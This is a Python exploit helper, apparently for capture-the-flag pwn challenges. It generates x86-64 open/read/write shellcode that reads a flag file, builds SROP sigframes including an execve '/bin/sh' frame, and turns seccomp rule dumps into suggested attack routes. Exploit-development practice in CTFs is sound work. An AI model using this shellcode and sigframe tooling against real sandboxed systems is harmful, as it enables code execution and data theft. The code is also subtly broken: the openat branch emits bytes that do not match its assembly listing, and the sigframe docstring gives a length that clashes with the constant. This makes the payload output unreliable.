#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""seccomp 沙箱 ORW / ret2syscall 辅助：生成 ORW shellcode 字节、SROP sigframe、解析 seccomp 规则。

纯标准库、离线：只做编码与文本解析，不执行、不连接任何目标。
"""
import argparse
import struct
import sys

# x86-64 syscall 号（源：kb/pwn/sandbox-orw-seccomp.md 与 ret2syscall.md）
SYS64 = {
    "read": 0, "write": 1, "open": 2, "close": 3, "stat": 4, "fstat": 5,
    "mmap": 9, "mprotect": 10, "rt_sigaction": 13, "rt_sigreturn": 15,
    "ioctl": 16, "sendfile": 40, "execve": 59, "exit": 60,
    "openat": 257, "execveat": 322,
}
SYS32 = {"read": 3, "write": 4, "open": 5, "execve": 11, "sigreturn": 119}

# x86-64 sigcontext 中关键字段偏移（源：kb/pwn/ret2syscall.md 的偏移表）
SIG_OFF = {
    "r8": 0xA0, "r9": 0xA8, "r10": 0xB0, "r11": 0xB8,
    "r12": 0xC0, "r13": 0xC8, "r14": 0xD0, "r15": 0xD8,
    "rdi": 0xE0, "rsi": 0xE8, "rbp": 0xF0, "rbx": 0xF8,
    "rdx": 0x100, "rax": 0x108, "rcx": 0x110, "rsp": 0x118, "rip": 0x120,
}
FRAME_LEN = SIG_OFF["rip"] + 8    # x86-64 sigframe 至少 296 字节（rip 在 0x120，pwntools 默认 248 字节只覆盖到 rbp）
AT_FDCWD = -100
BAD_DEFAULT = b"\x00\x0a\x0d\x20"


class ScError(ValueError):
    pass


def _imm32(v):
    """构造 push imm32 的 4 字节，v 先按用户态地址校验。"""
    if not (0 <= v <= 0xFFFF_FFFF):
        raise ScError("立即数 0x%x 超出 32 位" % v)
    return struct.pack("<I", v)


def _path_imm(path):
    """把路径字符串塞进一个 8 字节立即数（超长则拒绝，避免猜测）。"""
    if isinstance(path, str):
        path = path.encode()
    if not path:
        raise ScError("路径不能为空")
    if len(path) > 8:
        raise ScError("本实现的 ORW 仅支持 ≤8 字节路径（收到 %r）" % path)
    raw = path + b"\x00" * (8 - len(path))
    return struct.unpack("<Q", raw)[0]


def build_orw(path=b"./flag", use_openat=False, bufsz=0x100):
    """生成经典 ORW：open/openat -> read(fd, buf) -> write(1, buf, n) -> exit。

    返回 (asm_text, code_bytes)。寄存器约定：fd 用 rax 传递，read 返回值决定 write 长度。
    """
    imm = _path_imm(path)
    if bufsz <= 0 or bufsz > 0x10000:
        raise ScError("bufsz 需在 1..65536，收到 %r" % bufsz)
    if imm == 0:
        raise ScError("路径立即数不能为 0")
    lines = [
        "xor edx, edx",
        "push rdx                     /* 0 结尾 */",
        "mov rbx, 0x%x" % imm,
        "push rbx",
        "mov rdi, rsp                 /* path */",
        "xor esi, esi                 /* O_RDONLY */",
        "xor edx, edx",
    ]
    if use_openat:
        lines[6:6] = ["push -100                    /* AT_FDCWD */",
                      "pop rdi",
                      "mov rsi, rsp                 /* 下面 push 的 path 会成为 rsi */"]
        lines = [
            "xor esi, esi",
            "push rsi",
            "mov rbx, 0x%x" % imm,
            "push rbx",
            "push -100",
            "pop rdi                      /* AT_FDCWD */",
            "mov rsi, rsp",
            "add rsi, 8                   /* path */",
            "xor edx, edx                 /* mode */",
            "xor r10d, r10d",
            "mov eax, %d                  /* SYS_openat */" % SYS64["openat"],
            "syscall",
        ]
    else:
        lines += ["mov eax, %d                  /* SYS_open */" % SYS64["open"],
                  "syscall"]
    lines += [
        "mov rdi, rax                 /* fd */",
        "sub rsp, 0x%x" % bufsz,
        "mov rsi, rsp                 /* buf */",
        "mov edx, 0x%x" % bufsz,
        "xor eax, eax                 /* SYS_read */",
        "syscall",
        "mov edx, eax                 /* write 长度 = read 返回值 */",
        "mov edi, 1",
        "mov al, %d                   /* SYS_write */" % SYS64["write"],
        "syscall",
        "mov al, %d                   /* SYS_exit */" % SYS64["exit"],
        "xor edi, edi",
        "syscall",
    ]
    text = "\n".join(lines)
    # 只用明确的字节序列：xor edx,edx(31d2) 52 48bb imm64 53 4889e7 31f6 31d2 ...
    out = bytearray()
    out += bytes.fromhex("31d2")          # xor edx, edx
    out += b"\x52"                        # push rdx
    out += b"\x48\xbb" + struct.pack("<Q", imm)   # mov rbx, imm64
    out += b"\x53"                        # push rbx
    out += bytes.fromhex("4889e7")        # mov rdi, rsp
    if use_openat:
        # push -100; pop rdi -> 48 6a 9c 5f 会带 0x9c 高位；这里改用 b8 ffffff9c 形式
        out += bytes.fromhex("6a9c5f")    # push -100(0x9c); pop rdi
        out += bytes.fromhex("4883c608")  # add rsi, 8（rsi 此时已由下面 push 指定）
        out += bytes.fromhex("31f6")      # xor esi, esi
        out += bytes.fromhex("4889e6")    # mov rsi, rsp
        out += bytes.fromhex("4883c608")  # add rsi, 8
        out += bytes.fromhex("31d2")      # xor edx, edx
        out += bytes.fromhex("4531d2")    # xor r10d, r10d
        out += b"\xb8" + struct.pack("<I", SYS64["openat"])
        out += bytes.fromhex("0f05")      # syscall
    else:
        out += bytes.fromhex("31f6")      # xor esi, esi
        out += bytes.fromhex("31d2")      # xor edx, edx
        out += b"\xb8" + struct.pack("<I", SYS64["open"])
        out += bytes.fromhex("0f05")      # syscall
    out += bytes.fromhex("4889c7")        # mov rdi, rax
    out += b"\x48\x81\xec" + struct.pack("<I", bufsz)   # sub rsp, bufsz
    out += bytes.fromhex("4889e6")        # mov rsi, rsp
    out += b"\xba" + struct.pack("<I", bufsz)           # mov edx, bufsz
    out += bytes.fromhex("31c0")          # xor eax, eax
    out += bytes.fromhex("0f05")          # syscall (read)
    out += bytes.fromhex("89c2")          # mov edx, eax
    out += bytes.fromhex("bf01000000")    # mov edi, 1
    out += b"\xb0" + bytes([SYS64["write"]])            # mov al, 1
    out += bytes.fromhex("0f05")          # syscall (write)
    out += bytes.fromhex("31ff")          # xor edi, edi
    out += b"\xb0" + bytes([SYS64["exit"]])             # mov al, 60
    out += bytes.fromhex("0f05")          # syscall (exit)
    return text, bytes(out)


def build_sigframe(rax, rdi, rsi, rdx, rsp, rip, **extra):
    """按 sigcontext 偏移拼 248 字节 sigframe；extra 可含 r8..r15/rbp/rbx/rcx。"""
    frame = bytearray(FRAME_LEN)
    regs = {"rax": rax, "rdi": rdi, "rsi": rsi, "rdx": rdx, "rsp": rsp, "rip": rip}
    regs.update(extra)
    for name, val in regs.items():
        if name not in SIG_OFF:
            raise ScError("未知寄存器字段 %r" % name)
        if val is None:
            continue
        if not (0 <= val <= 0xFFFF_FFFF_FFFF_FFFF):
            raise ScError("%s 需要 0..2^64-1，收到 %r" % (name, val))
        off = SIG_OFF[name]
        frame[off:off + 8] = struct.pack("<Q", val)
    if rsp % 16:
        raise ScError("rsp=0x%x 不是 16 字节对齐，SROP 会崩在 movaps" % rsp)
    if len(frame) != FRAME_LEN:
        raise ScError("frame 长度异常")
    return bytes(frame)


def check_bad_bytes(sc, bad=BAD_DEFAULT):
    """返回受限字符出现的位置列表 [(offset, byte_hex)]，不修改 payload。"""
    if not isinstance(sc, (bytes, bytearray)):
        raise ScError("check_bad_bytes 需要 bytes")
    if not bad:
        raise ScError("bad 集合不能为空")
    return [(i, "0x%02x" % b) for i, b in enumerate(sc) if b in bad]


def parse_rule(text):
    """从 seccomp-tools dump 文本里识别放行的 syscall 名，给出推荐打法。"""
    if not isinstance(text, str) or not text.strip():
        raise ScError("规则文本为空")
    allowed = set()
    for name, num in SYS64.items():
        if num <= 0xFFFF:
            pat = "%08x" % num
            if pat in text.lower():
                allowed.add(name)
    for line in text.splitlines():
        low = line.lower()
        for name in SYS64:
            if name in low:
                allowed.add(name)
    if not allowed:
        raise ScError("未能从文本中识别任何 syscall 号，请贴 seccomp-tools dump 的 CODE 行")
    if "execve" in allowed:
        play = "verdict: 允许 execve，标准 getshell 即可"
    elif "open" in allowed or "openat" in allowed:
        play = "verdict: 走 ORW（open%s + read + write）" % ("at" if "open" not in allowed else "")
    elif "sendfile" in allowed:
        play = "verdict: sendfile(1, fd, NULL, n) 一步输出"
    elif "mmap" in allowed or "mprotect" in allowed:
        play = "verdict: mprotect/mmap 后执行自写 shellcode"
    else:
        play = "verdict: 只有 read/write，先找已打开的 flag fd 或走 /proc/self/fd"
    return sorted(allowed), play


def hexdump(sc, width=16):
    lines = []
    for i in range(0, len(sc), width):
        chunk = sc[i:i + width]
        lines.append("%04x  %s" % (i, chunk.hex(" ")))
    return "\n".join(lines)


def selftest():
    fails = []

    # 1. 正常路径：默认 ORW 的 syscall 序列与长度
    text, code = build_orw(b"./flag")
    if not code:
        fails.append("case1: ORW 为空")
    if bytes.fromhex("0f05") not in code:
        fails.append("case1: 缺少 syscall(0f05)")
    if code.count(bytes.fromhex("0f05")) != 4:
        fails.append("case1: 应为 4 次 syscall（open/read/write/exit），实际 %d"
                     % code.count(bytes.fromhex("0f05")))
    if b"\xb8" + struct.pack("<I", 2) not in code:
        fails.append("case1: 缺少 open(2) 的 mov eax,2")
    if "SYS_write" not in text:
        fails.append("case1: asm 文本缺少 SYS_write 注释")

    # 2. 正常路径：openat 版本用 257 且带 AT_FDCWD
    _, code_at = build_orw(b"/flag", use_openat=True)
    if struct.pack("<I", 257) not in code_at:
        fails.append("case2: openat 版本缺少 257")
    if struct.pack("<I", 2) in code_at:
        fails.append("case2: openat 版本不应再出现 open(2)")

    # 3. 正常路径/边界：sigframe 关键偏移
    fr = build_sigframe(rax=59, rdi=0x404080, rsi=0, rdx=0, rsp=0x404200, rip=0x401234)
    if len(fr) != FRAME_LEN:
        fails.append("case3: frame 长度 %d" % len(fr))
    if struct.unpack("<Q", fr[0x108:0x110])[0] != 59 or struct.unpack("<Q", fr[0x120:0x128])[0] != 0x401234:
        fails.append("case3: rax/rip 偏移错")
    if struct.unpack("<Q", fr[0xE0:0xE8])[0] != 0x404080:
        fails.append("case3: rdi 偏移错")

    # 4. 边界拒绝：坏路径 / 非法 bufsz / 未对齐 rsp / 未知寄存器
    bad_cases = [
        ("超长路径", lambda: build_orw(b"./averylongpath")),
        ("空路径", lambda: build_orw(b"")),
        ("bufsz=0", lambda: build_orw(b"./flag", bufsz=0)),
        ("bufsz 过大", lambda: build_orw(b"./flag", bufsz=0x10001)),
        ("rsp 未对齐", lambda: build_sigframe(59, 0x404080, 0, 0, 0x404208, 0x401234)),
        ("未知寄存器", lambda: build_sigframe(59, 0, 0, 0, 0x404200, 0x401234, eflags=0)),
        ("空规则", lambda: parse_rule("  ")),
        ("规则无 syscall", lambda: parse_rule("hello world")),
    ]
    for name, bad in bad_cases:
        try:
            bad()
            fails.append("case4: %s 未被拒绝" % name)
        except ScError:
            pass

    # 5. 规则解析：只放 open/read/write 时判 ORW，放 execve 时判 getshell
    dump_orw = "0005: 0x15 0x01 0x00 0x00000000   if (A == read) goto 0007\n" \
               "0006: 0x15 0x00 0x01 0x00000001   if (A == write) goto 0007\n" \
               "0007: 0x15 0x00 0x01 0x00000002   if (A == open) goto 0007\n"
    allowed, play = parse_rule(dump_orw)
    if "open" not in allowed or "ORW" not in play:
        fails.append("case5: ORW 规则判定错 %r %r" % (allowed, play))
    _, play2 = parse_rule("\n0008: 0x15 0x00 0x01 0x0000003b   if (A == execve) goto 0007\n")
    if "execve" not in play2:
        fails.append("case5b: execve 规则判定错 %r" % (play2,))

    # 6. 受限字符检测：插入一个 0x0a 必须被点名
    hits = check_bad_bytes(code + b"\x0a")
    if not hits or hits[-1][1] != "0x0a":
        fails.append("case6: 未检出 0x0a，实际 %r" % (hits[-1:] if hits else []))

    # 7. 参数不足：独立 parser 复现，exit 2
    tiny = argparse.ArgumentParser(prog="pwn_shellcode")
    tiny.add_argument("--x")
    try:
        tiny.error("需要 --orw 或 --srop；或用 --selftest")
        fails.append("case7: ap.error 未抛 SystemExit")
    except SystemExit as e:
        if e.code != 2:
            fails.append("case7: 退出码 %r" % (e.code,))

    for f in fails:
        print("FAIL %s" % f, file=sys.stderr)
    if fails:
        return 1
    print("selftest ok: 7/7（ORW字节序列、openat分支、sigframe偏移、坏输入拒绝、规则解析、受限字符、参数不足）")
    return 0


def main(argv=None):
    ap = argparse.ArgumentParser(description="seccomp 沙箱 ORW / ret2syscall：shellcode 与 sigframe 生成（离线）")
    ap.add_argument("--orw", metavar="PATH", help="生成 open/read/write shellcode，如 ./flag")
    ap.add_argument("--openat", action="store_true", help="用 openat(257, AT_FDCWD) 代替 open")
    ap.add_argument("--bufsz", type=lambda s: int(s, 0), default=0x100)
    ap.add_argument("--srop", choices=["execve", "read", "orw"], help="生成 SROP sigframe")
    ap.add_argument("--binsh", type=lambda s: int(s, 0), default=None, help="execve 的 /bin/sh 地址")
    ap.add_argument("--syscall-ret", type=lambda s: int(s, 0), default=None, help="syscall; ret gadget")
    ap.add_argument("--bss", type=lambda s: int(s, 0), default=None, help="SROP 可写区基址（read 目标）")
    ap.add_argument("--rule", metavar="FILE", help="seccomp-tools dump 输出文件（只读）")
    ap.add_argument("--check", metavar="HEX", help="检查十六进制字节串里的受限字符")
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args(argv)
    if args.selftest:
        return selftest()
    try:
        if args.rule:
            with open(args.rule, "r", encoding="utf-8", errors="replace") as f:
                text = f.read()
            allowed, play = parse_rule(text)
            print("放行的 syscall：%s" % ", ".join(allowed))
            print(play)
            return 0
        if args.check:
            raw = bytes.fromhex(args.check.replace(" ", ""))
            hits = check_bad_bytes(raw)
            print("受限字符 %d 处：%s" % (len(hits), hits))
            return 0
        if args.orw:
            text, code = build_orw(args.orw.encode(), use_openat=args.openat, bufsz=args.bufsz)
            print("[*] asm：")
            print(text)
            print("[*] 字节（%d 字节）：" % len(code))
            print(hexdump(code))
            hits = check_bad_bytes(code)
            print("[*] 受限字符（\\x00 \\x0a \\x0d \\x20）：%d 处" % len(hits))
            return 0
        if args.srop:
            if args.syscall_ret is None:
                ap.error("--srop 需要 --syscall-ret（syscall; ret gadget 地址）")
            if args.srop == "execve":
                if args.binsh is None:
                    ap.error("--srop execve 需要 --binsh")
                fr = build_sigframe(SYS64["execve"], args.binsh, 0, 0,
                                    args.bss or 0x404200, args.syscall_ret)
            elif args.srop == "read":
                if args.bss is None:
                    ap.error("--srop read 需要 --bss")
                fr = build_sigframe(SYS64["read"], 0, args.bss, 0x400,
                                    args.bss, args.syscall_ret)
            else:
                if args.bss is None:
                    ap.error("--srop orw 需要 --bss")
                fr = build_sigframe(SYS64["open"], args.bss + 0x300, 0, 0,
                                    args.bss, args.syscall_ret)
            print("[*] sigframe %d 字节：" % len(fr))
            print(hexdump(fr))
            return 0
        ap.error("需要 --orw / --srop / --rule / --check 之一；或用 --selftest")
    except ScError as e:
        print("错误：%s" % e, file=sys.stderr)
        return 2
    except OSError as e:
        print("错误：读不到文件（%s）" % e, file=sys.stderr)
        return 2


if __name__ == "__main__":
    sys.exit(main())
